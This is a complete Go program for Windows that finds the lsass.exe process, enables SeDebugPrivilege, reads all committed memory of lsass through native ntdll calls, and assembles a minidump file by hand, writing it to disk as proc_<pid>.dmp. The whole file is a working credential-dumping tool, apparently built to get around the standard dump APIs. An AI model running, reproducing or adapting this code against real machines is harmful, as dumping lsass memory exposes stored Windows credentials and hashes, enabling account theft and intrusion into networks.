package main


import (
	"os"
	"fmt"
	"unsafe"
	"strings"
	"syscall"
	"strconv"
	"math/big"
	"crypto/rand"
	"unicode/utf8"
	"unicode/utf16"
	//"encoding/json"
	"encoding/binary"
	"golang.org/x/sys/windows"
)


const (
	MAXIMUM_ALLOWED uintptr = 0x02000000
	PROCESS_QUERY_INFORMATION uintptr = 0x0400
	PROCESS_VM_READ uintptr = 0x0010
	SE_PRIVILEGE_ENABLED = 0x00000002
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY = 0x0008
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	ProcessBasicInformation uintptr = 0x00
	ProcessQueryInformation uintptr = 0x0400
	ProcessVmRead uintptr = 0x0010
	PAGE_NOACCESS uint32 = 0x01
	MEM_COMMIT uint32 = 0x00001000
	ldr_offset uintptr = 0x18
	inInitializationOrderModuleList_offset uintptr = 0x30
	flink_dllbase_offset uintptr = 0x20
	flink_buffer_offset uintptr = 0x50
	flink_buffer_fulldllname_offset uintptr = 0x40
	letters = "abcdefghijklmnopqrstuvwxyz"
)

var (
	rtlGetVersion *windows.LazyProc
	ntGetNextProcess *windows.LazyProc
	ntOpenProcess *windows.LazyProc
	ntQueryInformationProcess *windows.LazyProc
	ntReadVirtualMemory *windows.LazyProc
	ntQueryVirtualMemory *windows.LazyProc
	ntOpenProcessToken *windows.LazyProc
	ntAdjustPrivilegesToken *windows.LazyProc
	ntClose *windows.LazyProc
	getProcessImageFileName *windows.LazyProc
)


// Structures
type RTL_OSVERSIONINFOW struct {
	DwOSVersionInfoSize uint32
	DwMajorVersion      uint32
	DwMinorVersion      uint32
	DwBuildNumber       uint32
	DwPlatformId        uint32
	SzCSDVersion        [128]uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type CLIENT_ID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type PROCESS_BASIC_INFORMATION struct {
	ExitStatus                   uint32
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}


// Custom structures
type OSInformation struct {
	Field0	string `json:"field0"`
	Field1	string    `json:"field1"`
	Field2  string `json:"field2"`
}

type ModuleInformation struct {
	Field0	string `json:"field0"`
	Field1	string    `json:"field1"`
	Field2  string `json:"field2"`
	Field3  uint32 `json:"field3"`
}

type Mem64Information struct {
	Field0	uint64 `json:"field0"`
	Field1	uint32    `json:"field1"`
}


func init() {
	// ntdll
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	rtlGetVersion = ntdll.NewProc("RtlGetVersion")
	ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
	ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	ntOpenProcess = ntdll.NewProc("NtOpenProcess")
	ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
	ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")
	ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
	ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
	ntClose = ntdll.NewProc("NtClose")
	// psapi - Can I do this with ntdll?? :(
	psapi := windows.NewLazySystemDLL("psapi.dll")
	getProcessImageFileName = psapi.NewProc("GetProcessImageFileNameA")
}


func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
	buffer := make([]byte, size)
	var bytesRead uintptr
	status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
	if status != 0 {
		fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
		return 0
	}
	read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
	return read_value
}


func utf16BytesToUTF8(utf16Bytes []byte) []byte {
	u16s := make([]uint16, len(utf16Bytes)/2)
	for i := range u16s {
		u16s[i] = uint16(utf16Bytes[i*2]) | uint16(utf16Bytes[i*2+1])<<8
	}
	return []byte(string(utf16.Decode(u16s)))
}


func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr) string {
	buffer := make([]byte, size)
	var bytesRead uintptr
	status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
	if status != 0 {
		fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
		return ""
	}
	for i := 0; i < int(bytesRead)-1; i += 1 {
		if buffer[i] == 0x00 && buffer[i+1] == 0x00 {
			return string(utf16BytesToUTF8(buffer[:i+2]))
		}
	}
	return ""
}


func Reverse(s string) string {
	size := len(s)
	buf := make([]byte, size)
	for start := 0; start < size; {
		r, n := utf8.DecodeRuneInString(s[start:])
		start += n
		utf8.EncodeRune(buf[size-start:], r)
	}
	return string(buf)
}


func GetProcessByName(process_name string) []uintptr{
	var proc_handles_slice []uintptr;
	var s uintptr = 0;
	for {
		res, _, _ := ntGetNextProcess.Call(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s)))

		if (res != 0) {
			break
		}

		buf := [256]byte{}
		var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
		res, _, _ = getProcessImageFileName.Call(s, mem_address, 256);

		if (res > 1){
			var res_string string = string(buf[0:res]);
			var reverted_string string = Reverse(res_string);
			var index int = strings.Index(reverted_string, "\\");
			var result_name string = Reverse(reverted_string[0:index]);
			if (result_name == process_name){
				proc_handles_slice = append(proc_handles_slice, s);
			}
		}
	}
	return proc_handles_slice;
}


func enable_SeDebugPrivilege() bool {
	pid := uintptr(syscall.Getpid())
	hProcess := open_process(pid)

	// NtOpenProcessToken
	var tokenHandle syscall.Token
	ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
	if ntstatus != 0 {
		fmt.Printf("ntOpenProcessToken status: 0x%x\n", ntstatus)
		return false
	}
	luid := LUID{ LowPart:  20, HighPart: 0,}
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: 0x00000002, }, },
	}

	// NtAdjustPrivilegesToken
	ntstatus, _, _ = ntAdjustPrivilegesToken.Call(uintptr(tokenHandle), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if ntstatus != 0 {
		fmt.Printf("NtAdjustPrivilegesToken status: 0x%x\n", ntstatus)
		return false
	}

	// NtClose
	ntstatus, _, _ = ntClose.Call(uintptr(tokenHandle))
	if ntstatus != 0 {
		fmt.Printf("NtClose status: 0x%x\n", ntstatus)
		return false
	}

	return true
}


func open_process(pid uintptr) uintptr {
	var handle uintptr
	objectAttributes := OBJECT_ATTRIBUTES{}
	clientId := CLIENT_ID{UniqueProcess: pid}

	status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
	if (status != 0) {
		fmt.Printf("Failed to open process. NTSTATUS: 0x%X\n", status)
		return 0
	}
	return handle
}


func query_process_information(proc_handle uintptr) ([]ModuleInformation){
	var dll_base uintptr = 1337
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32

	// NtQueryInformationProcess
	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
	if status != 0 {
		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
		return nil
	}
	peb_addr := pbi.PebBaseAddress 
	fmt.Printf("[+] PebBaseAddress:\t0x%s\n", fmt.Sprintf("%x", peb_addr))

	ldr_pointer := peb_addr + ldr_offset
	fmt.Printf("[+] Ldr Pointer:\t0x%s\n", fmt.Sprintf("%x", ldr_pointer))

	ldr_addr := read_remoteintptr(proc_handle, ldr_pointer, 8)
	fmt.Printf("[+] Ldr Address:\t0x%s\n", fmt.Sprintf("%x", ldr_addr))

	inInitializationOrderModuleList := ldr_addr + inInitializationOrderModuleList_offset
	next_flink := read_remoteintptr(proc_handle, inInitializationOrderModuleList, 8)
	fmt.Printf("[+] next_flink: \t0x%s\n", fmt.Sprintf("%x", next_flink))

	moduleinfo_arr := []ModuleInformation{}
	
	for (dll_base != 0){
		next_flink = next_flink - 0x10
		dll_base = read_remoteintptr(proc_handle, (next_flink + flink_dllbase_offset), 8)
		if (dll_base == 0){
			break
		}

		buffer := read_remoteintptr(proc_handle, (next_flink + flink_buffer_offset), 8)
		base_dll_name := read_remoteWStr(proc_handle, buffer, 256)
		
		buffer = read_remoteintptr(proc_handle, (next_flink + flink_buffer_fulldllname_offset), 8)
		full_dll_path := read_remoteWStr(proc_handle, buffer, 256)
		
		module_info := ModuleInformation{ Field0: base_dll_name, Field1: full_dll_path, Field2: (fmt.Sprintf("%x", dll_base)), Field3: 0}
		moduleinfo_arr = append(moduleinfo_arr, module_info)
		next_flink = read_remoteintptr(proc_handle, (next_flink + 0x10), 8)
	}	

	return moduleinfo_arr

}


func find_object(moduleinfo_arr []ModuleInformation, aux_name string) (ModuleInformation){
	var results []ModuleInformation
	for i := 0; i < len(moduleinfo_arr); i++ {
		if moduleinfo_arr[i].Field0 == aux_name {
			results = append(results, moduleinfo_arr[i])	
		}
	}
	if (len(results) > 0) {
		return results[0]
	} else {
		module_info := ModuleInformation{ Field0: "", Field1: "", Field2: "", Field3: 0}
		return module_info
	}
}


func update_module_slice(moduleinfo_arr []ModuleInformation, aux_name string, aux_size int) ([]ModuleInformation){
	for i := 0; i < len(moduleinfo_arr); i++ {
		if moduleinfo_arr[i].Field0 == aux_name {
			moduleinfo_arr[i].Field3 = uint32(aux_size)
		}
	}
	return moduleinfo_arr
}


func get_pid(proc_handle uintptr) uintptr {
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
	if status != 0 {
		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
		return 0
	}
	pid := pbi.UniqueProcessID
	return pid
}


func writeToFile(file_name string, byteArray []byte) () {
	// Write to binary file
	file, err := os.OpenFile(file_name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		return
	}
	defer file.Close()
	_, err = file.Write(byteArray)
	if err != nil {
		fmt.Printf("Error writing to file: %v\n", err)
		return
	}
}


func randomString(length int) (string) {
    result := make([]byte, length)
    for i := range result {
        num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
        if err != nil {
            return ""
        }
        result[i] = letters[num.Int64()]
    }
    return string(result)
}


func get_dump_bytearr(osInfo []OSInformation, moduleinfo_arr []ModuleInformation, mem64list_arr []Mem64Information, memoryRegions_byte_arr []byte) ([]byte) {
	// Calculate values
	number_modules := len(moduleinfo_arr)
	modulelist_size := 4
	modulelist_size += 108*(number_modules)
	for i := 0; i < len(moduleinfo_arr); i++ {
		module_fullpath_len := len(moduleinfo_arr[i].Field1)
		modulelist_size += (module_fullpath_len*2 + 8)
	}
	mem64list_offset := modulelist_size + 0x7c
	mem64list_size := (16 + 16*len(mem64list_arr))
	offset_memory_regions := mem64list_offset + mem64list_size
	fmt.Printf("[+] Total number of modules: \t%v\n", number_modules)
	fmt.Printf("[+] ModuleListStream size:   \t%v\n", modulelist_size)
	fmt.Printf("[+] Mem64List offset: \t\t%v\n", mem64list_offset)
	fmt.Printf("[+] Mem64List size: \t\t%v\n", mem64list_size)

	// Header
	var header []byte
	header = append(header, 0x4d, 0x44, 0x4d, 0x50) // Signature
	header = append(header, 0x93, 0xa7) // Version
	header = append(header, 0x00, 0x00) // ImplementationVersion
	header = append(header, 0x03, 0x00, 0x00, 0x00) // NumberOfStreams
	header = append(header, 0x20, 0x00, 0x00, 0x00) // StreamDirectoryRva
	for len(header) < 32 { header = append(header, 0x00) } // Other fields

	// Stream Directory
	modulelist_sizeByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(modulelist_sizeByteSlice, uint32(modulelist_size))
	mem64list_sizeByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(mem64list_sizeByteSlice, uint32(mem64list_size))
	mem64list_offsetByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(mem64list_offsetByteSlice, uint32(mem64list_offset))
	var stream_directory []byte
	stream_directory = append(stream_directory, 0x04, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, modulelist_sizeByteSlice...)
	stream_directory = append(stream_directory, 0x7c, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x07, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x38, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x44, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x09, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, mem64list_sizeByteSlice...)
	stream_directory = append(stream_directory, mem64list_offsetByteSlice...)
	
	// SystemInfoStream
	processor_architecture := 9
	majorVersion := osInfo[0].Field0
	minorVersion := osInfo[0].Field1
	buildNumber := osInfo[0].Field2
	processor_architectureByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(processor_architectureByteSlice, uint32(processor_architecture))
	majorVersionByteSlice := make([]byte, 4)
	aux_uint, _ := strconv.ParseUint(majorVersion, 10, 32)
	binary.LittleEndian.PutUint32(majorVersionByteSlice, uint32(aux_uint))
	minorVersionByteSlice := make([]byte, 4)
	aux_uint, _ = strconv.ParseUint(minorVersion, 10, 32)
	binary.LittleEndian.PutUint32(minorVersionByteSlice, uint32(aux_uint))
	buildNumberByteSlice := make([]byte, 4)
	aux_uint, _ = strconv.ParseUint(buildNumber, 10, 32)
	binary.LittleEndian.PutUint32(buildNumberByteSlice, uint32(aux_uint))
	var systeminfostream []byte
	systeminfostream = append(systeminfostream, processor_architectureByteSlice...)
	systeminfostream = append(systeminfostream, 0x00, 0x00, 0x00, 0x00)
	systeminfostream = append(systeminfostream, majorVersionByteSlice...)
	systeminfostream = append(systeminfostream, minorVersionByteSlice...)
	systeminfostream = append(systeminfostream, buildNumberByteSlice...)
	for len(systeminfostream) < 56 { systeminfostream = append(systeminfostream, 0x00) }

	// ModuleListStream
	var modulelist_stream []byte
	number_modules_ByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(number_modules_ByteSlice, uint32(number_modules))
	modulelist_stream = append(modulelist_stream, number_modules_ByteSlice...)
	pointer_index := 0x7c
	pointer_index += 4 // len(number_modulesByteSlice)
	pointer_index += (108*(number_modules))
	for i := 0; i < len(moduleinfo_arr); i++ {
		// Base Address
		field2_ByteSlice := make([]byte, 8)
		aux_field2, _ := strconv.ParseInt(moduleinfo_arr[i].Field2, 16, 64)
		binary.LittleEndian.PutUint64(field2_ByteSlice, uint64(aux_field2))
		// Size
		field3_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint32(field3_ByteSlice, uint32(moduleinfo_arr[i].Field3))
		// Index to module full path in unicode format
		pointer_index_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint32(pointer_index_ByteSlice, uint32(pointer_index))
		// Append
		modulelist_stream = append(modulelist_stream, field2_ByteSlice...)
		modulelist_stream = append(modulelist_stream, field3_ByteSlice...)
		modulelist_stream = append(modulelist_stream, 0x00, 0x00, 0x00, 0x00)
		modulelist_stream = append(modulelist_stream, pointer_index_ByteSlice...)
		pointer_index += (len(moduleinfo_arr[i].Field1)*2 + 8)		
		// Irrelevant fields to 0
		for i := 0; i < 80; i++ { modulelist_stream = append(modulelist_stream, 0x00) }
	}
	for i := 0; i < len(moduleinfo_arr); i++ {
		full_path := moduleinfo_arr[i].Field1
		full_path_length := len(full_path)
		// Full path length
		full_path_length_ByteSlice := make([]byte, 4)
		binary.LittleEndian.PutUint32(full_path_length_ByteSlice, uint32(full_path_length*2))
		// Full path to Unicode byte array
		full_path_utf16Encoded := utf16.Encode([]rune(full_path))
		unicode_bytearr := make([]byte, len(full_path_utf16Encoded)*2)
		for i, v := range full_path_utf16Encoded {
			binary.LittleEndian.PutUint16(unicode_bytearr[i*2:], v)
		}
		// Append
		modulelist_stream = append(modulelist_stream,full_path_length_ByteSlice...)
		modulelist_stream = append(modulelist_stream,unicode_bytearr...)
		modulelist_stream = append(modulelist_stream, 0x00, 0x00, 0x00, 0x00)
	}

	// Memory64List
	var memory64list_stream []byte
	// NumberOfEntries
	numberOfEntries_ByteSlice := make([]byte, 8)
	binary.LittleEndian.PutUint32(numberOfEntries_ByteSlice, uint32(len(mem64list_arr)))
	// Offset to memory regions
	offsetToMemoryRegions_ByteSlice := make([]byte, 8)
	binary.LittleEndian.PutUint32(offsetToMemoryRegions_ByteSlice, uint32(offset_memory_regions))
	// Append
	memory64list_stream = append(memory64list_stream, numberOfEntries_ByteSlice...)
	memory64list_stream = append(memory64list_stream, offsetToMemoryRegions_ByteSlice...)

	for i := 0; i < len(mem64list_arr); i++ {
		// Address
		mem64address := mem64list_arr[i].Field0
		// aux_mem64address, _ := strconv.ParseInt(mem64address, 16, 64)
		mem64Address_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint64(mem64Address_ByteSlice, uint64(mem64address))
		// Size
		mem64size := mem64list_arr[i].Field1
		mem64size_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint64(mem64size_ByteSlice, uint64(mem64size))
		// Append
		memory64list_stream = append(memory64list_stream, mem64Address_ByteSlice...)
		memory64list_stream = append(memory64list_stream, mem64size_ByteSlice...)
	}

    // Concatenate each part byte array
    var dump_file_bytes []byte
    dump_file_bytes = append(dump_file_bytes, header...)
    dump_file_bytes = append(dump_file_bytes, stream_directory...)
    dump_file_bytes = append(dump_file_bytes, systeminfostream...)
    dump_file_bytes = append(dump_file_bytes, modulelist_stream...)
    dump_file_bytes = append(dump_file_bytes, memory64list_stream...)
    dump_file_bytes = append(dump_file_bytes, memoryRegions_byte_arr...)    
	return dump_file_bytes
}


func main() {
	// OS Information
	var osVersionInfo RTL_OSVERSIONINFOW
	osVersionInfo.DwOSVersionInfoSize = uint32(unsafe.Sizeof(osVersionInfo))
	ret, _, err := rtlGetVersion.Call(uintptr(unsafe.Pointer(&osVersionInfo)))
	if ret != 0 {
		fmt.Printf("RtlGetVersion failed: %v\n", err)
		return
	}
	osInfo := []OSInformation{{ Field0: fmt.Sprint(osVersionInfo.DwMajorVersion) , Field1: fmt.Sprint(osVersionInfo.DwMinorVersion), Field2: fmt.Sprint(osVersionInfo.DwBuildNumber)}}
	
	// Get PID
	process_name := "lsass.exe"
	proc_handle := GetProcessByName(process_name)[0]
	pid := get_pid(proc_handle)
	fmt.Printf("[+] Process PID:    \t%d\n", pid)
	
	// Get SeDebugPrivilege
	priv_enabled := enable_SeDebugPrivilege()
	fmt.Printf("[+] Privilege Enabled:\t%t\n", priv_enabled)

	// Get process handle
	proc_handle = open_process(pid)
	fmt.Printf("[+] Process Handle: \t%d\n", proc_handle)
	
	// Get modules information (except module size)
	moduleinfo_arr := query_process_information(proc_handle)
	
	// Get size for each module
	var mem_address uintptr = 0
	var proc_max_address_l uintptr = 0x7FFFFFFEFFFF
	
    // Slice/Array for Mem64Information objects
	mem64list_arr := []Mem64Information{}
	memoryRegions_byte_arr := []byte{}

	aux_size := 0
	aux_name := ""

	for (mem_address < proc_max_address_l){
		var memInfo MEMORY_BASIC_INFORMATION
		var resultLength uintptr
		status, _, _ := ntQueryVirtualMemory.Call(proc_handle, mem_address, 0, uintptr(unsafe.Pointer(&memInfo)), uintptr(unsafe.Sizeof(memInfo)), uintptr(unsafe.Pointer(&resultLength)))
		if status != 0 {
			fmt.Printf("NtQueryVirtualMemory failed with status: 0x%x\n", status)
			return
		}	
		if (memInfo.Protect != PAGE_NOACCESS && memInfo.State == MEM_COMMIT){
			// Region info + Memory Dump
			buffer := make([]byte, memInfo.RegionSize)
			var bytesRead uintptr
			ntReadVirtualMemory.Call(proc_handle, memInfo.BaseAddress, uintptr(unsafe.Pointer(&buffer[0])), memInfo.RegionSize, uintptr(unsafe.Pointer(&bytesRead)))

			/// Add to buffer
			memoryRegions_byte_arr = append(memoryRegions_byte_arr, buffer...)

			// Add module information to slice
			mem64Info := Mem64Information{ Field0: uint64(memInfo.BaseAddress), Field1: uint32(memInfo.RegionSize),}
			mem64list_arr = append(mem64list_arr, mem64Info)

			// Module size
			var matching_object ModuleInformation = find_object(moduleinfo_arr, aux_name)
			matchingObjectUint64, _ := strconv.ParseUint(matching_object.Field2, 0, 64)
			if (memInfo.RegionSize == 0x1000 && memInfo.BaseAddress != uintptr(matchingObjectUint64)){
				moduleinfo_arr = update_module_slice(moduleinfo_arr, aux_name, aux_size)
				for i := 0; i < len(moduleinfo_arr); i++ {
					auxUint64, _ := strconv.ParseUint(moduleinfo_arr[i].Field2, 16, 64)
					if memInfo.BaseAddress == uintptr(auxUint64){
						aux_name = moduleinfo_arr[i].Field0
						aux_size = int(memInfo.RegionSize)
					}
				}
			} else {
				aux_size += int(memInfo.RegionSize)
			}
		}
		mem_address += memInfo.RegionSize
	}

	// Get dump file bytes
	dump_file := get_dump_bytearr(osInfo, moduleinfo_arr, mem64list_arr, memoryRegions_byte_arr)	
	output_file := "proc_" +  fmt.Sprintf("%d", pid) + ".dmp"
	
	// Write to file
	writeToFile(output_file, dump_file)	
	fmt.Printf("[+] File %s generated.\n", output_file)
}